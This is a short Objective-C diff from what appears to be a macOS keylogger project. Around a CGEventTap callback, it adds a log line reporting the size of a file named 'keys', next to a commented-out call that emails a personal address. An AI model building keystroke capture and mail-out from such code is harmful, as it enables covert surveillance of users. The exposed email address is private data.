@@ -28,6 +28,7 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
     [_mouse setMouseNotifications];
     
     //[EmailSender sendEmailWithMail:@"i.suprynovic@gmail.com" withSubject:@"Hello" Attachments:nil];
+    NSLog(@"%llu", [FileManager getFileSize:@"keys"]);
 }
 
 @end
